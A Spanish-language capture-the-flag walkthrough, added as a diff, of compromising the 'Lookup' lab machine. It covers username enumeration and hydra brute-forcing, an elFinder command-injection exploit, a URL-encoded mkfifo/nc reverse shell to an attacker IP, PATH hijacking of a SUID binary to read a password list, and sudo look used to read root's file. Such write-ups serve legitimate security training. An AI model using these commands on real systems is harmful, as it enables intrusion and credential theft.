@@ -1,2 +1,530 @@
 #Lookup Walkthrough
 #Los cambios de ip en la máquina se deben a que a la he completado en varios días, o al reinicio de la misma.
+
+Comienzo con un escaneo de puertos -p-.
+
+ sudo nmap -p- 10.130.133.176
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-04 11:08 CEST
+Nmap scan report for 10.130.133.176
+Host is up (0.032s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
+
+Tan solo dos puertos, es un ctf web.
+
+Hago un escaneo -sVC, por si encuentra algo interesante con una enumeración web básica.
+
+ sudo nmap -sVC -p 80 10.130.133.176
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-04 11:09 CEST
+Nmap scan report for 10.130.133.176
+Host is up (0.036s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://lookup.thm
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
+
+Añado lookup.thm a /etc/hosts
+
+Voy a la web del puerto 80. Veo un formulario de login.
+Enumero subdirectorios por si hay algo expuesto.
+
+sudo dirsearch -u http://lookup.thm/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_lookup.thm/__26-09-04_11-11-55.txt
+
+Target: http://lookup.thm/
+
+[11:11:55] Starting: 
+[11:11:58] 403 -  275B  - /.ht_wsr.txt
+[11:11:58] 403 -  275B  - /.htaccess.bak1
+[11:11:58] 403 -  275B  - /.htaccess.save
+[11:11:58] 403 -  275B  - /.htaccess.sample
+[11:11:58] 403 -  275B  - /.htaccess.orig
+[11:11:58] 403 -  275B  - /.htaccess_extra
+[11:11:58] 403 -  275B  - /.htaccess_sc
+[11:11:58] 403 -  275B  - /.htaccess_orig
+[11:11:58] 403 -  275B  - /.htaccessBAK
+[11:11:58] 403 -  275B  - /.htaccessOLD
+[11:11:58] 403 -  275B  - /.htaccessOLD2
+[11:11:58] 403 -  275B  - /.htm
+[11:11:58] 403 -  275B  - /.html
+[11:11:58] 403 -  275B  - /.httr-oauth
+[11:11:58] 403 -  275B  - /.htpasswds
+[11:11:58] 403 -  275B  - /.htpasswd_test
+[11:11:59] 403 -  275B  - /.php
+[11:12:13] 200 -    1B  - /login.php
+[11:12:19] 403 -  275B  - /server-status
+[11:12:19] 403 -  275B  - /server-status/
+
+Task Completed
+
+Solo login.php.
+
+De primeras me da por intentar buscar SQLI con sqlmap.
+
+sqlmap -u "http://lookup.thm/login.php" --data="username=admin&password=test" --batch
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:13:51 /2026-09-04/
+
+[11:13:51] [INFO] testing connection to the target URL
+got a refresh intent (redirect like response common to login pages) to 'http://lookup.thm'. Do you want to apply it from now on? [Y/n] Y
+[11:13:51] [INFO] checking if the target is protected by some kind of WAF/IPS
+[11:13:51] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+are you sure that you want to continue with further target testing? [Y/n] Y
+[11:13:51] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[11:13:51] [INFO] testing if the target URL content is stable
+[11:13:51] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:13:51] [INFO] searching for dynamic content
+[11:13:52] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)
+[11:13:52] [WARNING] target URL content appears to be too dynamic. Switching to '--text-only' 
+[11:13:52] [INFO] testing if POST parameter 'username' is dynamic
+[11:13:52] [INFO] POST parameter 'username' appears to be dynamic
+[11:13:52] [INFO] testing for SQL injection on POST parameter 'username'
+[11:13:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:13:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:13:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:13:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[11:13:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[11:13:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[11:13:55] [INFO] testing 'Generic inline queries'
+[11:13:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[11:13:56] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[11:13:56] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[11:13:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:13:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[11:13:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[11:13:58] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[11:13:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[11:13:59] [WARNING] POST parameter 'username' does not seem to be injectable
+[11:13:59] [INFO] testing if POST parameter 'password' is dynamic
+[11:13:59] [INFO] POST parameter 'password' appears to be dynamic
+[11:13:59] [INFO] testing for SQL injection on POST parameter 'password'
+[11:13:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:14:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:14:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:14:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[11:14:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[11:14:02] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[11:14:03] [INFO] testing 'Generic inline queries'
+[11:14:03] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[11:14:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[11:14:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[11:14:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:14:05] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[11:14:05] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[11:14:06] [INFO] testing 'Oracle AND time-based blind'
+[11:14:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[11:14:07] [WARNING] POST parameter 'password' does not seem to be injectable
+[11:14:07] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[11:14:07] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:14:07 /2026-09-04/
+
+He probado varias más, sin éxito.
+
+Probando con diversas credenciales en la web, manualmente, me doy cuenta de una cosa.
+
+administrator:administrator me da este error de login.
+
+Wrong username or password. Please try again.
+Redirecting in 3 seconds.
+
+Y tras probar un poco, admin:admin me saca el siguiente error.
+
+Wrong password. Please try again.
+Redirecting in 3 seconds.
+
+Tiene un mensaje de error que confirma la existencia de users. 
+Ya tengo un user, admin, ahora pruebo fuerza bruta para conseguir la password.
+
+Tras dejar trabajar a hydra un rato, no me saca nada, asique intuyo que no va por ahí la máquina. 
+Sigo buscando usuarios. 
+
+Tras probar con un par de wordlists, names.txt me saca un usuario más.
+
+ffuf -u http://lookup.thm/login.php -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -w /home/mksk/wordlists/names.txt -fr "Wrong username or password" -t 50 -o usuarios_encontrados.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://lookup.thm/login.php
+ :: Wordlist         : FUZZ: /home/mksk/wordlists/names.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=FUZZ&password=test
+ :: Output file      : usuarios_encontrados.txt
+ :: File format      : json
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: Wrong username or password
+________________________________________________
+
+admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 31ms]
+jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 29ms]
+:: Progress: [10735/10735] :: Job [1/1] :: 1623 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
+
+Bueno, ahora vuelvo a probar con hydra.
+
+hydra -l jose -P /home/mksk/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -t 4 -w 1 -f -V
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[WARNING] the waittime you set is low, this can result in errornous results
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-04 11:30:19
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
+[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong password
+[ATTEMPT] target lookup.thm - login "jose" - pass "123456" - 1 of 14344398 [child 0] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "12345" - 2 of 14344398 [child 1] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "password" - 4 of 14344398 [child 3] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "iloveyou" - 5 of 14344398 [child 0] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "princess" - 6 of 14344398 [child 1] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "1234567" - 7 of 14344398 [child 2] (0/0)
+*
+*
+[ATTEMPT] target lookup.thm - login "jose" - pass "gothic" - 1388 of 14344398 [child 0] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "walker" - 1389 of 14344398 [child 2] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "maribel" - 1390 of 14344398 [child 1] (0/0)
+[80][http-post-form] host: lookup.thm   login: jose   password: password123
+[STATUS] attack finished for lookup.thm (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-04 11:32:25
+
+Bueno, pues ya tengo un set de credenciales. 
+
+jose:password123
+
+Al loguearme da error de página no encontrada, y la url marca un subdominio.
+
+http://files.lookup.thm/
+
+Lo añado a /etc/hosts.
+
+10.130.133.176 lookup.thm files.lookup.thm
+
+Es una web de gestión de contenido, elfinder.
+Busco la versión.
+
+elFinder
+Administrador de archivos web
+Versión: 2.1.47
+versión del protocolo: 2.1047
+jQuery/jQuery UI: 3.3.1/1.12.1
+
+Por cierto, encuentro un archivo con posibles credenciales.
+think : nopassword
+
+Al buscar esta versión, veo que tiene una vulnerabilidad de Command Injection.
+
+Creo un archivo jpg vacío.
+
+echo "dummy" > SecSignal.jpg
+
+Y ejecuto el exploit.
+
+ python2.7 46481.py "http://files.lookup.thm/elFinder/"
+[*] Uploading the malicious image...
+[*] Running the payload...
+[*] The site seems not to be vulnerable :(
+
+Falla.
+Bueno, tan solo hay una cosa que pueda ser, ya que es la versión correcta.
+
+Me descargo otro jpg en luegar del dummy.
+
+cp Felis_silvestris_silvestris_small_gradual_decrease_of_quality_-_JPEG_compression.jpg SecSignal.jpg
+python2.7 46481.py "http://files.lookup.thm/elFinder/"
+[*] Uploading the malicious image...
+[*] Running the payload...
+[+] Pwned! :)
+[+] Getting the shell...
+$ 
+
+Ahora funciona.
+
+$ whoami
+www-data
+
+$ ls /home
+ssm-user
+think
+ubuntu
+
+Veo que el usuario think tiene un /home.
+Pruebo con las credenciales que he encontrado antes.
+
+Para loguearme necesito una shell sh. Asique comienzo a probar con payloads de revshell.
+
+Las payloads de python cuelgan la máquina.
+Finalmente encuentro mkfifo URLencoded
+
+$ rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.131.65%209003%20%3E%2Ftmp%2Ff
+
+sudo nc -lnvp 9003
+Listening on 0.0.0.0 9003
+Connection received on 10.130.133.176 35088
+sh: 0: can't access tty; job control turned off
+$ 
+
+$ su think
+Password: nopasswd
+su: Authentication failure
+$ think
+sh: 4: think: not found
+$ su think
+Password: 
+su: Authentication failure
+
+Tras probar un par de logins, concluyo que es más una pista que credenciales-
+
+$ ls -la /home/think
+total 40
+drwxr-xr-x 5 think think 4096 Jan 11  2024 .
+drwxr-xr-x 5 root  root  4096 Sep  4 09:07 ..
+lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
+-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
+-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
+drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
+drwx------ 3 think think 4096 Aug  9  2023 .gnupg
+-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
+-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
+drw-r----- 2 think think 4096 Jun 21  2023 .ssh
+lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
+-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
+
+En su escritorio encuentro .passwords, propiedad de root.
+
+Sigo buscando maneras de escalar privilegios,
+
+$ find / -perm -4000 2>/dev/null
+/snap/snapd/19457/usr/lib/snapd/snap-confine
+/snap/core20/1950/usr/bin/chfn
+/snap/core20/1950/usr/bin/chsh
+/snap/core20/1950/usr/bin/gpasswd
+/snap/core20/1950/usr/bin/mount
+/snap/core20/1950/usr/bin/newgrp
+/snap/core20/1950/usr/bin/passwd
+/snap/core20/1950/usr/bin/su
+/snap/core20/1950/usr/bin/sudo
+/snap/core20/1950/usr/bin/umount
+/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1950/usr/lib/openssh/ssh-keysign
+/snap/core20/1974/usr/bin/chfn
+/snap/core20/1974/usr/bin/chsh
+/snap/core20/1974/usr/bin/gpasswd
+/snap/core20/1974/usr/bin/mount
+/snap/core20/1974/usr/bin/newgrp
+/snap/core20/1974/usr/bin/passwd
+/snap/core20/1974/usr/bin/su
+/snap/core20/1974/usr/bin/sudo
+/snap/core20/1974/usr/bin/umount
+/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1974/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pwm
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+
+/usr/sbin/pwm 
+
+No es un binario estándar, me llama la atención.
+
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+$ 
+
+Lee el id, y luego el archivo .passwords del usuario al que corresponde el id.
+
+Usa id, pruebo a secuestrar el binario.
+
+$ cat > /tmp/id << 'EOF'
+#!/bin/bash
+echo "uid=1001(think) gid=1001(think) groups=1001(think)"
+EOF> > > 
+
+$ chmod +x /tmp/id
+
+$ export PATH=/tmp:$PATH
+
+$ /usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose'sbabygurl
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+josemario.AKA(think)
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+
+Me llama la atención la contraseña que tiene escrito el usuario.
+
+$ su think
+Password: josemario.AKA(think)
+whoami
+think
+
+Era esa.
+
+Consigo la primera flag en el home de think.
+
+cd think
+ls
+user.txt
+cat user.txt
+38*********************
+
+Ya que tengo ssh, pruebo para conseguir una shell mejor.
+
+ssh think@10.130.133.176
+The authenticity of host '10.130.133.176 (10.130.133.176)' can't be established.
+ED25519 key fingerprint is SHA256:7z/j6G/7TCy7vVLsuJ3VjCtmsabACNpLLkOrPSpCMWQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.130.133.176' (ED25519) to the list of known hosts.
+think@10.130.133.176's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 04 Sep 2026 10:21:39 AM UTC
+
+  System load:  0.0               Processes:             132
+  Usage of /:   63.5% of 9.75GB   Users logged in:       0
+  Memory usage: 26%               IPv4 address for ens5: 10.130.133.176
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+221 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sun May 12 12:07:25 2024 from 192.168.14.1
+think@ip-10-130-133-176:~$ whoami
+think
+
+Pruebo un sudo -l
+
+think@ip-10-130-133-176:~$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on ip-10-130-133-176:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on ip-10-130-133-176:
+    (ALL) /usr/bin/look
+
+Me pide contraseña pero me deja ejecutarlo.
+
+Busco /look en GTFOBins.
+
+look '' /path/to/input-file
+
+Encuentro lo siguiente, me sirve para leer.
+
+Consigo la segunda flag.
+
+think@ip-10-130-133-176:~$ sudo look '' /root/root.txt
+5a*************************+
